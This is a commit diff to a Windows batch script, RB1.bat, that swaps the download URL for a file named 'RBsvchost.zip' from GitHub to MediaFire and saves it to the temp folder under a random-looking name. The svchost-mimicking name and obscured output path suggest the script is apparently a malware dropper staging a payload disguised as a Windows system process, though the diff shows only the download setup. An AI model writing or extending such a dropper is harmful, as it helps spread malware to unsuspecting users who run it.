5bc24ddde2a4d80a87ba82e7b037f54095df06a8
LuisPhantom <trsaaptrsatrsa@gmail.com>
2024-12-19 07:43:17 -0800

    Update RB1.bat

--- RB1.bat
+++ RB1.bat
@@ -1,6 +1,6 @@
 @echo off
 setlocal
-set "url=https://github.com/LuisPhantom/Vemom/raw/refs/heads/main/RBsvchost.zip"
+set "url=https://download848.mediafire.com/9rqhu2r9h2egS-pQ35eYPVVUDjwAIr-fjaaj7OcE5_tVM2mnzoGIDK5tH0H1RaYW5BkTqXeU0E0P1t3-DSqwifzvdfGp93671oeUFZYqaJ08qi9jflsCBxCbg-YqQDnrVGjVPLX7JPTsd4AXxjFFRf7MdYvgJ9vcEbPlZFnJBoCS/1lwt6c6scya4pro/RBsvchost+%281%29.zip"
 set "tempdir=%temp%"
 set "output=%tempdir%\4g5h790g2345h7890g2345h90g2345h-890v2345h789-3v5h.zip"
 
